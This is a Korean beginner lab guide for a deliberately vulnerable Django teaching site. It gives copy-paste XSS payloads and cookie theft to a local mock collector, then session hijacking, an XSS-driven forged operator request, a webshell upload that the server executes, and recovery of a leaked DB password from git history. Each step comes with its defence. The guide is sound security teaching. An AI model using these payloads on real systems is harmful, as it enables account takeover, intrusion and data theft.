# 초보용 단계별 공격 가이드 (ATTACK GUIDE)

> 웹 취약점을 **처음 배우는 학생**을 위한 실습 순서다.
> 쉬운 것부터(🟢 기초) 어려운 것(🔴 심화)으로 올라간다.
> 모든 페이로드는 **복사해서 그대로** 붙여넣으면 된다. 각 단계에 **힌트**와 **막는 법**이 있다.
>
> ⚠️ 교육용 가상 환경에서만 사용한다. 실제 사이트에 하면 불법이다.

---

## 0. 준비 (딱 한 번)

1. 사이트가 **취약(vulnerable) 모드**인지 확인한다.
   - `/lab/status/` 접속 → `LAB_COMMENTS_RENDER_SAFE` 가 **True** 여야 한다.
   - True 가 아니면 댓글 XSS 가 안 터진다(그게 정상 방어 상태). 실습하려면 서버를
     `DJANGO_SETTINGS_MODULE=config.settings.vulnerable` 로 띄워야 한다.
2. 연습용 게시글을 하나 정한다. `/board/` 에서 아무 글이나 열면 된다.
3. 역할을 나눈다.
   - **공격자** = 댓글을 쓰는 사람(그냥 방문자).
   - **피해 운영자** = `operator` 로 로그인한 사람(계정은 `docs/ACCOUNTS.md`).
   - 한 컴퓨터에서 연습하려면 **일반 창 = 운영자**, **시크릿 창 = 공격자** 로 창을 나눈다.

---

## 레벨 1 🟢 — XSS 팝업 띄우기 (제일 쉬움, 성공 경험)

**목표:** 댓글에 넣은 코드가 '글자'가 아니라 '프로그램'으로 실행되는 걸 눈으로 본다.

**복붙 페이로드 (댓글 내용에 붙여넣기):**
```html
<script>alert('XSS')</script>
```

**방법:**
1. 아무 게시글을 연다.
2. 맨 아래 댓글 입력칸에 위 코드를 붙여넣고 **등록**.
3. 그 게시글을 **새로고침**(또는 다시 열기).

**기대 결과:** `XSS` 라고 적힌 **경고 팝업**이 뜬다. 🎉

**왜 되나요?** 취약 모드에서는 댓글을 화면에 그릴 때 `{{ 댓글|safe }}` 로 처리해서,
`<script>` 를 '글자'가 아니라 '진짜 코드'로 실행하기 때문이다.

**힌트 (안 되면):**
- 팝업이 없으면 → `/lab/status/` 에서 `LAB_COMMENTS_RENDER_SAFE=True` 인지 확인.
- 글자 그대로 `<script>alert('XSS')</script>` 가 보이면 → 지금은 안전(fixed/base) 모드다.

**막는 법:** 출력할 때 자동 이스케이프(`{{ 댓글 }}`). 그러면 코드가 그냥 '글자'로 보인다.

---

## 레벨 2 🟢 — 내 쿠키 훔쳐보기 (한 줄 더)

**목표:** 스크립트로 브라우저의 쿠키를 읽을 수 있다는 걸 본다.

**복붙 페이로드:**
```html
<script>alert(document.cookie)</script>
```

**기대 결과:** `csrftoken=...` 같은 쿠키 문자열이 팝업으로 뜬다.

**관찰 포인트:** 팝업에 **`sessionid` 는 안 보일 것이다.**
→ 로그인 세션 쿠키는 기본적으로 `HttpOnly` 라서 자바스크립트가 못 읽기 때문이다.
이걸 뚫는 게 레벨 3.

**막는 법:** 중요한 쿠키는 `HttpOnly` 로 둔다(기본값). 애초에 XSS 를 막는 게 1순위.

---

## 레벨 3 🔴 — 세션 쿠키를 공격자에게 보내기 (세션 탈취)

**전제(중요):** 세션 탈취는 추가 취약 설정이 있어야 재현된다.
`config.settings.vulnerable` 의 `SESSION_COOKIE_HTTPONLY=False`.
`/lab/status/` 의 `SESSION_COOKIE_HTTPONLY` 가 **False** 인지 확인.

**복붙 페이로드 (댓글에 붙여넣기):**
```html
<script>new Image().src='/lab/collector/?c='+encodeURIComponent(document.cookie);</script>
```

**방법:**
1. 위 댓글을 등록한다(공격자 역할).
2. **운영자**가 그 게시글을 **열람**한다(일반 창에서 operator 로그인 후 열기).
3. 열람하는 순간, 운영자의 쿠키가 '모의 수집기'(`/lab/collector/`)로 전송된다.

**기대 결과:** `/lab/status/` 의 **'sessionid 포함' 수치**가 올라간다.
(수집 기록은 `lab_collector/stolen_cookies.log` 에도 남는다.)

**세션 이전(계정 탈취) 해보기:**
1. 공격자 창(시크릿 창) 개발자도구 콘솔에 입력:
   ```js
   document.cookie = "sessionid=<수집된 값>; path=/";
   ```
2. `/operator/` 로 이동 → **로그인 안 했는데** 운영자 화면이 열리면 탈취 성공.

**왜 되나요?** `HttpOnly` 가 꺼져 있어 스크립트가 `sessionid` 를 읽어 외부로 보낼 수 있다.

**막는 법:** `SESSION_COOKIE_HTTPONLY=True`(기본값) + XSS 자체 차단.

---

## 레벨 4 🔴 — 운영자 권한으로 링크 바꾸기 (강제 요청)

**목표:** 쿠키를 훔치지 않아도, '운영자가 열람하는 순간' 그 권한으로 요청을 보낼 수 있다.

**복붙 페이로드 (댓글에 붙여넣기):**
```html
<script>
function c(n){var m=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return m?m.pop():'';}
fetch('/operator/links/',{method:'POST',
  headers:{'Content-Type':'application/x-www-form-urlencoded','X-CSRFToken':c('csrftoken')},
  credentials:'same-origin',
  body:'key=resume&url='+encodeURIComponent('/uploads/run/webshell.sh')});
</script>
```

**방법:** 댓글 등록 → **운영자가 그 글을 열람**하면 실행된다.

**기대 결과:**
- `/operator/audit/` 에 `link_change`(actor=operator) 기록.
- 메인 페이지 `resume` 링크 주소가 `/uploads/run/webshell.sh` 로 바뀜.

**왜 되나요?** 운영자 브라우저가 쿠키를 자동으로 붙여 보내고(그래서 HttpOnly 여도 됨),
CSRF 토큰도 같은 사이트 스크립트가 `csrftoken` 쿠키에서 읽어 넣기 때문이다.
→ **CSRF 보호만으로는 same-origin XSS 를 못 막는다**는 교훈.

**막는 법:** 근본 원인인 XSS 를 막는다(출력 이스케이프).

---

## 레벨 5 🔴 — 파일 올려서 서버에서 코드 실행 (웹쉘)

**전제:** 취약 모드(`LAB_UPLOAD_VALIDATE_IMAGE=False`, `LAB_RUN_UPLOADS=True`). 운영자 권한.

**방법:**
1. 운영자 로그인 → **프로필 사진 업로드**에서 `attack/webshell.sh` 를 올린다
   (확장자 검증이 없어 그대로 저장됨).
2. 브라우저로 `/uploads/run/webshell.sh` 에 접속(또는 레벨 4 로 바뀐 `resume` 링크 클릭).

**기대 결과:** 서버가 그 스크립트를 **실행**하고, `shared/uploads/_evidence/` 에
`pwned_*.txt` 같은 증거 파일이 생긴다. `whoami` 결과(실행 계정)도 남는다.

**왜 되나요?** 이미지인 척 올린 `.sh` 를 서버가 검증 없이 저장하고, 실행 엔드포인트가
그대로 실행하기 때문이다.

**막는 법:** 확장자 화이트리스트 + 이미지 재인코딩(Pillow), 업로드 파일 실행 금지.

---

## 레벨 6 🔴 — 깃 이력에서 옛 DB 비밀번호 찾기

**방법 (서버에서):**
```bash
bash scripts/create_lab_git_history.sh          # 실습 저장소 1회 생성
git -C git_exposure_demo log --oneline
git -C git_exposure_demo log -p -- deploy/db_config.py | grep -n DB_PASSWORD
```

**기대 결과:** 최신 파일엔 지워졌지만 **과거 커밋**에 `DB_PASSWORD` 가 남아 있다.

**왜 되나요?** 파일에서 지워도 깃 히스토리에는 그대로 남기 때문. `.git` 이 노출되면 복구된다.

**막는 법:** 비밀을 코드에 넣지 않기, 노출됐다면 **값을 교체(rotate)** 하기
(`scripts/rotate_leak_credential.sql`). 파일에서 지우는 것만으론 부족.

---

## 레벨 7 🔴 — 훔친 계정으로 DB 조회 (유출 '범위' 확인)

**방법 (서버에서, 레벨 6 에서 찾은 계정으로):**
```bash
python scripts/leak_demo.py --host 127.0.0.1 --dbname portfolio_lab \
  --user app_legacy --password <깃에서 찾은 비밀번호>
```

**기대 결과:**
- `demo_records_democustomer` 조회 **성공** (유출 범위 안).
- `auth_user` 는 **권한 거부** (유출 범위 밖).

**교훈:** 비밀번호가 평문으로 있어도, 그 계정 권한이 작으면 유출 범위가 제한된다.
→ "평문 저장 봤다 = DB 전체 털렸다" 가 **아니다**.

**막는 법:** 최소 권한 계정, 복원 필요 데이터는 접근통제/암호화로 보호.

---

## 한눈에 보기

| 레벨 | 난이도 | 공격 | 핵심 개념 |
|---|---|---|---|
| 1 | 🟢 | XSS 팝업 | 출력 이스케이프 |
| 2 | 🟢 | 쿠키 읽기 | HttpOnly |
| 3 | 🔴 | 세션 탈취 | HttpOnly=False 추가 취약 |
| 4 | 🔴 | 강제 요청 | same-origin XSS vs CSRF |
| 5 | 🔴 | 업로드 웹쉘 | 파일 검증/실행 금지 |
| 6 | 🔴 | 깃 비밀 노출 | 히스토리 잔존·교체 |
| 7 | 🔴 | DB 유출 범위 | 최소 권한 |

> 더 자세한 배경은 `docs/ARCHITECTURE.md`, 조사(방어) 관점은 `docs/INVESTIGATION.md`,
> 막는 방법 모음은 `docs/FIX_MODE.md` 참고.
